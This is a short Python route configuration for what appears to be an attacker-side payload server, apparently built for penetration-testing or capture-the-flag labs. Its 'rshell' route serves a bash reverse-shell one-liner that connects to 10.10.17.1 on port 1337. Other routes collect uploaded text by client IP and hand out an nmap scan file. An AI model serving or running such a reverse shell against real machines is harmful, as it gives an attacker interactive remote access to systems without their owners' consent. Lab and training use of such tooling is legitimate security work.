from functions import upload_text, download
import datetime

""" Necessary files and folders """
necessary_files_folders = [
    "./downloads/escaneo_nmap",
    "./uploaded.txt",
]

"""
Define paths ( /route/args => ["route", lambda args: mapped_function] )
+ lambda x: string -> return string mapping
+ lambda x: function() -> use function

Functions have access to:
+ upload_text(x, ip, time, file="uploaded_text.txt", limit_ip=None)
+ download(file)

"""
paths = [
    ["", lambda x, req: "main"  ],
    ["status", lambda x, req: "uptime" ],
    ["rshell", lambda x, req: "/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1"],
    ["upload", lambda x, req: upload_text(
        x, req['ip'], req['time'],
        file="uploaded.txt", limit_ip=5
    )],
    ["escaneo-nmap", lambda x, req: download("./downloads/escaneo_nmap") ],
]